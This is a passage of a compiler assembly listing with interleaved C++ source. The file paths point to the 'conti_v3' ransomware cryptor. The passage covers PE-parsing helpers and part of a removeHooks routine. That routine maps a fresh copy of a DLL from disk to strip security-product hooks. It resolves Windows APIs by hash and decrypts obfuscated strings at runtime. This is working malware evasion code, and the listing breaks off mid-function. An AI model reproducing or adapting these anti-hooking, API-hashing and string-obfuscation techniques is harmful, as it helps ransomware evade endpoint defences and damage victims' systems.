  0000f	b9 0b 01 00 00	 mov	 ecx, 267		; 0000010bH
  00014	41 0f b7 43 18	 movzx	 eax, WORD PTR [r11+24]
  00019	66 3b c1	 cmp	 ax, cx
  0001c	74 0a		 je	 SHORT $LN23@Rva2Offset

; 122  : 
; 123  :         // PE32
; 124  : 
; 125  :         PIMAGE_NT_HEADERS32 pNtHeaders32 = (PIMAGE_NT_HEADERS32)pNtHeaders;
; 126  :         pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders32->OptionalHeader) + pNtHeaders32->FileHeader.SizeOfOptionalHeader);
; 127  :         wNumberOfSections = pNtHeaders32->FileHeader.NumberOfSections;
; 128  :     }
; 129  :     else {
; 130  :         if (pNtHeaders->OptionalHeader.Magic == 0x020B) {

  0001e	b9 0b 02 00 00	 mov	 ecx, 523		; 0000020bH
  00023	66 3b c1	 cmp	 ax, cx
  00026	75 62		 jne	 SHORT $LN17@Rva2Offset
$LN23@Rva2Offset:

; 141  :         }
; 142  :     }
; 143  : 
; 144  :     if (dwRva < pSectionHeader[0].PointerToRawData)

  00028	49 8b cb	 mov	 rcx, r11
  0002b	b8 14 00 00 00	 mov	 eax, 20
  00030	0f b7 1c 08	 movzx	 ebx, WORD PTR [rax+rcx]
  00034	48 83 c3 18	 add	 rbx, 24
  00038	49 03 db	 add	 rbx, r11
  0003b	45 0f b7 5b 06	 movzx	 r11d, WORD PTR [r11+6]
  00040	44 3b 53 14	 cmp	 r10d, DWORD PTR [rbx+20]
  00044	73 09		 jae	 SHORT $LN9@Rva2Offset

; 145  :         return dwRva;

  00046	41 8b c2	 mov	 eax, r10d

; 152  :         }
; 153  :     }
; 154  : 
; 155  :     return 0;
; 156  : }

  00049	48 8b 5c 24 08	 mov	 rbx, QWORD PTR [rsp+8]
  0004e	c3		 ret	 0
$LN9@Rva2Offset:

; 146  : 
; 147  :     for (wIndex = 0; wIndex < wNumberOfSections; wIndex++) {

  0004f	33 d2		 xor	 edx, edx
  00051	66 41 3b d3	 cmp	 dx, r11w
  00055	73 33		 jae	 SHORT $LN17@Rva2Offset
  00057	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL4@Rva2Offset:

; 148  : 
; 149  :         if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData)) {

  00060	0f b7 c2	 movzx	 eax, dx
  00063	48 8d 0c 80	 lea	 rcx, QWORD PTR [rax+rax*4]
  00067	44 8b 4c cb 0c	 mov	 r9d, DWORD PTR [rbx+rcx*8+12]
  0006c	4c 8d 04 cb	 lea	 r8, QWORD PTR [rbx+rcx*8]
  00070	45 3b d1	 cmp	 r10d, r9d
  00073	72 0c		 jb	 SHORT $LN2@Rva2Offset
  00075	41 8b 48 10	 mov	 ecx, DWORD PTR [r8+16]
  00079	41 03 c9	 add	 ecx, r9d
  0007c	44 3b d1	 cmp	 r10d, ecx
  0007f	72 11		 jb	 SHORT $LN13@Rva2Offset
$LN2@Rva2Offset:

; 146  : 
; 147  :     for (wIndex = 0; wIndex < wNumberOfSections; wIndex++) {

  00081	66 ff c2	 inc	 dx
  00084	66 41 3b d3	 cmp	 dx, r11w
  00088	72 d6		 jb	 SHORT $LL4@Rva2Offset
$LN17@Rva2Offset:

; 131  : 
; 132  :             // PE64
; 133  : 
; 134  :             PIMAGE_NT_HEADERS64 pNtHeaders64 = (PIMAGE_NT_HEADERS64)pNtHeaders;
; 135  :             pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders64->OptionalHeader) + pNtHeaders64->FileHeader.SizeOfOptionalHeader);
; 136  :             wNumberOfSections = pNtHeaders64->FileHeader.NumberOfSections;
; 137  :         }
; 138  :         else
; 139  :         {
; 140  :             return 0;

  0008a	33 c0		 xor	 eax, eax

; 152  :         }
; 153  :     }
; 154  : 
; 155  :     return 0;
; 156  : }

  0008c	48 8b 5c 24 08	 mov	 rbx, QWORD PTR [rsp+8]
  00091	c3		 ret	 0
$LN13@Rva2Offset:

; 150  : 
; 151  :             return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);

  00092	41 8b 40 14	 mov	 eax, DWORD PTR [r8+20]

; 152  :         }
; 153  :     }
; 154  : 
; 155  :     return 0;
; 156  : }

  00096	48 8b 5c 24 08	 mov	 rbx, QWORD PTR [rsp+8]
  0009b	41 2b c1	 sub	 eax, r9d
  0009e	41 03 c2	 add	 eax, r10d
  000a1	c3		 ret	 0
?Rva2Offset@@YAKK_K@Z ENDP				; Rva2Offset
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp
;	COMDAT ?ah_isalfanum@@YA_ND@Z
_TEXT	SEGMENT
C$ = 8
?ah_isalfanum@@YA_ND@Z PROC				; ah_isalfanum, COMDAT

; 160  :     bool res = (C >= 'a' && C <= 'z') || (C >= 'A' && C <= 'Z') || (C >= '0' && C <= '9');

  00000	8d 41 9f	 lea	 eax, DWORD PTR [rcx-97]
  00003	3c 19		 cmp	 al, 25
  00005	76 12		 jbe	 SHORT $LN5@ah_isalfan
  00007	8d 41 bf	 lea	 eax, DWORD PTR [rcx-65]
  0000a	3c 19		 cmp	 al, 25
  0000c	76 0b		 jbe	 SHORT $LN5@ah_isalfan
  0000e	80 e9 30	 sub	 cl, 48			; 00000030H
  00011	80 f9 09	 cmp	 cl, 9
  00014	76 03		 jbe	 SHORT $LN5@ah_isalfan

; 161  :     return res;

  00016	32 c0		 xor	 al, al

; 162  : }

  00018	c3		 ret	 0
$LN5@ah_isalfan:

; 161  :     return res;

  00019	b0 01		 mov	 al, 1

; 162  : }

  0001b	c3		 ret	 0
?ah_isalfanum@@YA_ND@Z ENDP				; ah_isalfanum
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp
;	COMDAT ?isForwardedFunc@@YA_NPEBX@Z
_TEXT	SEGMENT
funcAddr$ = 8
?isForwardedFunc@@YA_NPEBX@Z PROC			; isForwardedFunc, COMDAT

; 166  :     char* func = (char*)funcAddr;
; 167  :     const int max_check = 128;
; 168  :     bool forwarder = true;
; 169  : 
; 170  :     for (int i = 0; func[i] && i < max_check; ++i) {

  00000	80 39 00	 cmp	 BYTE PTR [rcx], 0
  00003	4c 8b c1	 mov	 r8, rcx
  00006	74 4a		 je	 SHORT $LN28@isForwarde
  00008	48 8b d1	 mov	 rdx, rcx
  0000b	0f 1f 44 00 00	 npad	 5
$LL4@isForwarde:
  00010	48 8b c2	 mov	 rax, rdx
  00013	49 2b c0	 sub	 rax, r8
  00016	48 3d 80 00 00
	00		 cmp	 rax, 128		; 00000080H
  0001c	7d 34		 jge	 SHORT $LN28@isForwarde

; 171  : 
; 172  :         if (!(ah_isalfanum(func[i]) || func[i] == '.' || func[i] == '_' || func[i] == '-')) {

  0001e	0f b6 02	 movzx	 eax, BYTE PTR [rdx]

; 160  :     bool res = (C >= 'a' && C <= 'z') || (C >= 'A' && C <= 'Z') || (C >= '0' && C <= '9');

  00021	3c 61		 cmp	 al, 97			; 00000061H
  00023	7c 07		 jl	 SHORT $LN9@isForwarde
  00025	3c 7a		 cmp	 al, 122			; 0000007aH
  00027	7e 21		 jle	 SHORT $LN2@isForwarde
$LN24@isForwarde:

; 173  :             forwarder = false;
; 174  :             break;
; 175  :         }
; 176  :     }
; 177  : 
; 178  :     return forwarder;

  00029	32 c0		 xor	 al, al

; 179  : }

  0002b	c3		 ret	 0
$LN9@isForwarde:

; 160  :     bool res = (C >= 'a' && C <= 'z') || (C >= 'A' && C <= 'Z') || (C >= '0' && C <= '9');

  0002c	8d 48 bf	 lea	 ecx, DWORD PTR [rax-65]
  0002f	80 f9 19	 cmp	 cl, 25
  00032	76 16		 jbe	 SHORT $LN2@isForwarde
  00034	3c 30		 cmp	 al, 48			; 00000030H
  00036	7c 06		 jl	 SHORT $LN19@isForwarde
  00038	3c 39		 cmp	 al, 57			; 00000039H
  0003a	7f 06		 jg	 SHORT $LN22@isForwarde
  0003c	eb 0c		 jmp	 SHORT $LN2@isForwarde
$LN19@isForwarde:

; 171  : 
; 172  :         if (!(ah_isalfanum(func[i]) || func[i] == '.' || func[i] == '_' || func[i] == '-')) {

  0003e	3c 2e		 cmp	 al, 46			; 0000002eH
  00040	74 08		 je	 SHORT $LN2@isForwarde
$LN22@isForwarde:
  00042	3c 5f		 cmp	 al, 95			; 0000005fH
  00044	74 04		 je	 SHORT $LN2@isForwarde
  00046	3c 2d		 cmp	 al, 45			; 0000002dH
  00048	75 df		 jne	 SHORT $LN24@isForwarde
$LN2@isForwarde:

; 166  :     char* func = (char*)funcAddr;
; 167  :     const int max_check = 128;
; 168  :     bool forwarder = true;
; 169  : 
; 170  :     for (int i = 0; func[i] && i < max_check; ++i) {

  0004a	48 ff c2	 inc	 rdx
  0004d	80 3a 00	 cmp	 BYTE PTR [rdx], 0
  00050	75 be		 jne	 SHORT $LL4@isForwarde
$LN28@isForwarde:

; 179  : }

  00052	b0 01		 mov	 al, 1
  00054	c3		 ret	 0
?isForwardedFunc@@YA_NPEBX@Z ENDP			; isForwardedFunc
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp
;	COMDAT ?removeHooks@@YAXPEAUHINSTANCE__@@@Z
_TEXT	SEGMENT
$T1 = 64
pe32magic$ = 80
pe64magic$ = 84
hmodule$GSCopy$1$ = 88
oldProtect$3 = 96
oldProtect1$4 = 100
LargeInt$ = 104
moduleRealPath$ = 112
__$ArrayPad$ = 640
hmodule$ = 704
?removeHooks@@YAXPEAUHINSTANCE__@@@Z PROC		; removeHooks, COMDAT

; 183  : {

$LN176:
  00000	40 55		 push	 rbp
  00002	53		 push	 rbx
  00003	57		 push	 rdi
  00004	48 8d ac 24 60
	fe ff ff	 lea	 rbp, QWORD PTR [rsp-416]
  0000c	48 81 ec a0 02
	00 00		 sub	 rsp, 672		; 000002a0H
  00013	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0001a	48 33 c4	 xor	 rax, rsp
  0001d	48 89 85 80 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp-256], rax

; 184  :     UINT_PTR uiBaseAddress = 0;
; 185  :     UINT_PTR uiExportDir = 0;
; 186  :     UINT_PTR uiNameArray = 0;
; 187  :     UINT_PTR uiAddressArray = 0;
; 188  :     UINT_PTR uiNameOrdinals = 0;
; 189  :     DWORD dwCounter = 0;
; 190  :     volatile int pe32magic = 0x10b;

  00024	c7 44 24 50 0b
	01 00 00	 mov	 DWORD PTR pe32magic$[rsp], 267 ; 0000010bH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 63   :         if (!isDecrypted())

  0002c	33 ff		 xor	 edi, edi
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp

; 191  :     volatile int pe64magic = 0x20b;

  0002e	c7 44 24 54 0b
	02 00 00	 mov	 DWORD PTR pe64magic$[rsp], 523 ; 0000020bH
  00036	48 8b d9	 mov	 rbx, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00039	c6 44 24 40 00	 mov	 BYTE PTR $T1[rsp], 0
  0003e	c6 44 24 41 15	 mov	 BYTE PTR $T1[rsp+1], 21
  00043	c6 44 24 42 0e	 mov	 BYTE PTR $T1[rsp+2], 14
  00048	c6 44 24 43 08	 mov	 BYTE PTR $T1[rsp+3], 8
  0004d	c6 44 24 44 58	 mov	 BYTE PTR $T1[rsp+4], 88	; 00000058H
  00052	c6 44 24 45 0e	 mov	 BYTE PTR $T1[rsp+5], 14
  00057	c6 44 24 46 01	 mov	 BYTE PTR $T1[rsp+6], 1
  0005c	c6 44 24 47 7d	 mov	 BYTE PTR $T1[rsp+7], 125 ; 0000007dH
  00061	c6 44 24 48 12	 mov	 BYTE PTR $T1[rsp+8], 18
  00066	c6 44 24 49 62	 mov	 BYTE PTR $T1[rsp+9], 98	; 00000062H
  0006b	c6 44 24 4a 22	 mov	 BYTE PTR $T1[rsp+10], 34 ; 00000022H
  00070	c6 44 24 4b 01	 mov	 BYTE PTR $T1[rsp+11], 1
  00075	c6 44 24 4c 01	 mov	 BYTE PTR $T1[rsp+12], 1
  0007a	c6 44 24 4d 02	 mov	 BYTE PTR $T1[rsp+13], 2
  0007f	0f b6 44 24 41	 movzx	 eax, BYTE PTR $T1[rsp+1]

; 58   :         return m_isDecrypted;

  00084	0f b6 44 24 40	 movzx	 eax, BYTE PTR $T1[rsp]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp

; 183  : {

  00089	48 89 4c 24 58	 mov	 QWORD PTR hmodule$GSCopy$1$[rsp], rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 63   :         if (!isDecrypted())

  0008e	84 c0		 test	 al, al
  00090	75 63		 jne	 SHORT $LN52@removeHook

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00092	44 8b cf	 mov	 r9d, edi
  00095	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL53@removeHook:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  000a0	42 0f b6 4c 0c
	41		 movzx	 ecx, BYTE PTR $T1[rsp+r9+1]

; 40   :     return (a % n + n) % n;

  000a6	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  000ab	83 e9 02	 sub	 ecx, 2
  000ae	44 6b c1 13	 imul	 r8d, ecx, 19

; 40   :     return (a % n + n) % n;

  000b2	41 f7 e8	 imul	 r8d
  000b5	41 03 d0	 add	 edx, r8d
  000b8	c1 fa 06	 sar	 edx, 6
  000bb	8b c2		 mov	 eax, edx
  000bd	c1 e8 1f	 shr	 eax, 31
  000c0	03 d0		 add	 edx, eax
  000c2	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  000c5	44 2b c0	 sub	 r8d, eax
  000c8	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  000cd	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  000d1	41 f7 e8	 imul	 r8d
  000d4	41 03 d0	 add	 edx, r8d
  000d7	c1 fa 06	 sar	 edx, 6
  000da	8b c2		 mov	 eax, edx
  000dc	c1 e8 1f	 shr	 eax, 31
  000df	03 d0		 add	 edx, eax
  000e1	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  000e4	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  000e7	46 88 44 0c 41	 mov	 BYTE PTR $T1[rsp+r9+1], r8b
  000ec	49 ff c1	 inc	 r9
  000ef	49 83 f9 0d	 cmp	 r9, 13
  000f3	72 ab		 jb	 SHORT $LL53@removeHook
$LN52@removeHook:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1265 : 	pFunction = (HMODULE(WINAPI*)(LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x439c7e33, 4);

  000f5	ba 0f 00 00 00	 mov	 edx, 15
  000fa	41 b8 33 7e 9c
	43		 mov	 r8d, 1134329395		; 439c7e33H
  00100	44 8d 4a f5	 lea	 r9d, QWORD PTR [rdx-11]
  00104	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1266 : 	return pFunction(lpLibFileName);

  00109	48 8d 4c 24 41	 lea	 rcx, QWORD PTR $T1[rsp+1]
  0010e	ff d0		 call	 rax

; 1205 : 	pFunction = (DWORD(WINAPI*)(HMODULE, LPWSTR, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xebd9a617, 8);

  00110	ba 0f 00 00 00	 mov	 edx, 15
  00115	41 b8 17 a6 d9
	eb		 mov	 r8d, -338057705		; ebd9a617H
  0011b	44 8d 4a f9	 lea	 r9d, QWORD PTR [rdx-7]
  0011f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1206 : 	return pFunction(hModule, lpFilename, nSize);

  00124	41 b8 04 01 00
	00		 mov	 r8d, 260		; 00000104H
  0012a	48 8d 54 24 70	 lea	 rdx, QWORD PTR moduleRealPath$[rsp]
  0012f	48 8b cb	 mov	 rcx, rbx
  00132	ff d0		 call	 rax

; 174  : 	pFunction = (HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x017610e8, 97);//GetProcAddress(hKernel32, OBFA("CreateFileW"));

  00134	ba 0f 00 00 00	 mov	 edx, 15
  00139	41 b8 e8 10 76
	01		 mov	 r8d, 24514792		; 017610e8H
  0013f	44 8d 4a 52	 lea	 r9d, QWORD PTR [rdx+82]
  00143	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 175  : 	return pFunction(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);

  00148	45 33 c9	 xor	 r9d, r9d
  0014b	48 89 7c 24 30	 mov	 QWORD PTR [rsp+48], rdi
  00150	c7 44 24 28 80
	00 00 00	 mov	 DWORD PTR [rsp+40], 128	; 00000080H
  00158	48 8d 4c 24 70	 lea	 rcx, QWORD PTR moduleRealPath$[rsp]
  0015d	ba 00 00 00 80	 mov	 edx, -2147483648	; 80000000H
  00162	c7 44 24 20 03
	00 00 00	 mov	 DWORD PTR [rsp+32], 3
  0016a	45 8d 41 01	 lea	 r8d, QWORD PTR [r9+1]
  0016e	ff d0		 call	 rax
  00170	48 8b d8	 mov	 rbx, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp

; 232  :     if (!hFile)

  00173	48 85 c0	 test	 rax, rax
  00176	0f 84 01 03 00
	00		 je	 $LN126@removeHook
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 102  : 	pFunction = (BOOL(WINAPI*)(HANDLE, PLARGE_INTEGER))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x43ba1ffb, 104);//GetProcAddress(hKernel32, OBFA("GetFileSizeEx"));

  0017c	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp

; 232  :     if (!hFile)

  00181	48 89 b4 24 c8
	02 00 00	 mov	 QWORD PTR [rsp+712], rsi
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 102  : 	pFunction = (BOOL(WINAPI*)(HANDLE, PLARGE_INTEGER))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x43ba1ffb, 104);//GetProcAddress(hKernel32, OBFA("GetFileSizeEx"));

  00189	41 b8 fb 1f ba
	43		 mov	 r8d, 1136271355		; 43ba1ffbH
  0018f	44 8d 4a 59	 lea	 r9d, QWORD PTR [rdx+89]
  00193	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 103  : 	return pFunction(hFile, lpFileSize);

  00198	48 8d 54 24 68	 lea	 rdx, QWORD PTR LargeInt$[rsp]
  0019d	48 8b cb	 mov	 rcx, rbx
  001a0	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp

; 251  :     Size = LargeInt.QuadPart;

  001a2	8b 74 24 68	 mov	 esi, DWORD PTR LargeInt$[rsp]

; 252  :     if (!Size)

  001a6	ba 0f 00 00 00	 mov	 edx, 15
  001ab	85 f6		 test	 esi, esi
  001ad	0f 84 02 03 00
	00		 je	 $LN174@removeHook
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1222 : 	pFunction = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x90b93fda, 7);

  001b3	44 8d 4a f8	 lea	 r9d, QWORD PTR [rdx-8]
  001b7	41 b8 da 3f b9
	90		 mov	 r8d, -1866907686	; 90b93fdaH
  001bd	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1223 : 	return pFunction(hFile, lpFileMappingAttributes, flProtect, dwMaximumSizeHigh, dwMaximumSizeLow, lpName);

  001c2	45 33 c9	 xor	 r9d, r9d
  001c5	48 89 7c 24 28	 mov	 QWORD PTR [rsp+40], rdi
  001ca	33 d2		 xor	 edx, edx
  001cc	89 7c 24 20	 mov	 DWORD PTR [rsp+32], edi
  001d0	48 8b cb	 mov	 rcx, rbx
  001d3	45 8d 41 02	 lea	 r8d, QWORD PTR [r9+2]
  001d7	ff d0		 call	 rax
  001d9	48 8b f8	 mov	 rdi, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp

; 273  :     if (!hFileMap)

  001dc	ba 0f 00 00 00	 mov	 edx, 15
  001e1	48 85 c0	 test	 rax, rax
  001e4	0f 84 cb 02 00
	00		 je	 $LN174@removeHook
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1238 : 	pFunction = (LPVOID(WINAPI*)(HANDLE, DWORD, DWORD, DWORD, SIZE_T))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x0ab3c572, 6);

  001ea	44 8d 4a f7	 lea	 r9d, QWORD PTR [rdx-9]
  001ee	41 b8 72 c5 b3
	0a		 mov	 r8d, 179553650		; 0ab3c572H
  001f4	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1239 : 	return pFunction(hFileMappingObject, dwDesiredAccess, dwFileOffsetHigh, dwFileOffsetLow, dwNumberOfBytesToMap);

  001f9	45 33 c9	 xor	 r9d, r9d
  001fc	48 89 74 24 20	 mov	 QWORD PTR [rsp+32], rsi
  00201	45 33 c0	 xor	 r8d, r8d
  00204	48 8b cf	 mov	 rcx, rdi
  00207	41 8d 51 04	 lea	 edx, QWORD PTR [r9+4]
  0020b	ff d0		 call	 rax
  0020d	48 8b f0	 mov	 rsi, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp

; 286  :     if (!originDll)

  00210	48 85 c0	 test	 rax, rax
  00213	0f 84 7e 02 00
	00		 je	 $LN11@removeHook

; 287  :     {
; 288  :         pCloseHandle(hFileMap);
; 289  :         pCloseHandle(hFile);
; 290  :         return;
; 291  :     }
; 292  : 
; 293  :     uiBaseAddress = (UINT_PTR)originDll;
; 294  : 
; 295  :     // get the File Offset of the modules NT Header
; 296  :     uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

  00219	48 63 50 3c	 movsxd	 rdx, DWORD PTR [rax+60]
  0021d	48 03 d0	 add	 rdx, rax

; 297  : 
; 298  :     if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == pe32magic)

  00220	8b 44 24 50	 mov	 eax, DWORD PTR pe32magic$[rsp]
  00224	0f b7 4a 18	 movzx	 ecx, WORD PTR [rdx+24]
  00228	3b c8		 cmp	 ecx, eax
  0022a	75 06		 jne	 SHORT $LN9@removeHook

; 299  :     {
; 300  :         uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS32)

  0022c	48 8d 4a 78	 lea	 rcx, QWORD PTR [rdx+120]

; 301  :             uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
; 302  :     }

  00230	eb 17		 jmp	 SHORT $LN12@removeHook
$LN9@removeHook:

; 303  :     else
; 304  :     {
; 305  :         if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == pe64magic)

  00232	0f b7 4a 18	 movzx	 ecx, WORD PTR [rdx+24]
  00236	8b 44 24 54	 mov	 eax, DWORD PTR pe64magic$[rsp]
  0023a	3b c8		 cmp	 ecx, eax
  0023c	0f 85 55 02 00
	00		 jne	 $LN11@removeHook

; 306  :         {
; 307  :             uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS64)

  00242	48 8d 8a 88 00
	00 00		 lea	 rcx, QWORD PTR [rdx+136]
$LN12@removeHook:

; 308  :                 uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
; 309  :         }
; 310  :         else
; 311  :         {
; 312  :             pCloseHandle(hFileMap);
; 313  :             pCloseHandle(hFile);
; 314  :             return;
; 315  :         }
; 316  :     }
; 317  : 
; 318  :     // get the File Offset of the export directory
; 319  :     uiExportDir = uiBaseAddress

  00249	8b 09		 mov	 ecx, DWORD PTR [rcx]
  0024b	48 8b d6	 mov	 rdx, rsi
  0024e	4c 89 a4 24 d0
	02 00 00	 mov	 QWORD PTR [rsp+720], r12
  00256	4c 89 ac 24 d8
	02 00 00	 mov	 QWORD PTR [rsp+728], r13
  0025e	4c 89 b4 24 98
	02 00 00	 mov	 QWORD PTR [rsp+664], r14
  00266	4c 89 bc 24 90
	02 00 00	 mov	 QWORD PTR [rsp+656], r15
  0026e	e8 00 00 00 00	 call	 ?Rva2Offset@@YAKK_K@Z	; Rva2Offset
  00273	44 8b e8	 mov	 r13d, eax

; 320  :         + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress);
; 321  : 
; 322  :     // get the File Offset for the array of name pointers
; 323  :     uiNameArray = uiBaseAddress

  00276	48 8b d6	 mov	 rdx, rsi
  00279	4c 03 ee	 add	 r13, rsi
  0027c	41 8b 4d 20	 mov	 ecx, DWORD PTR [r13+32]
  00280	e8 00 00 00 00	 call	 ?Rva2Offset@@YAKK_K@Z	; Rva2Offset

; 324  :         + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames, uiBaseAddress);
; 325  : 
; 326  :     // get the File Offset for the array of addresses
; 327  :     uiAddressArray = uiBaseAddress
; 328  :         + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions,
; 329  :             uiBaseAddress);
; 330  : 
; 331  :     // get the File Offset for the array of name ordinals
; 332  :     uiNameOrdinals = uiBaseAddress

  00285	41 8b 4d 24	 mov	 ecx, DWORD PTR [r13+36]
  00289	48 8b d6	 mov	 rdx, rsi
  0028c	44 8b f0	 mov	 r14d, eax
  0028f	4c 03 f6	 add	 r14, rsi
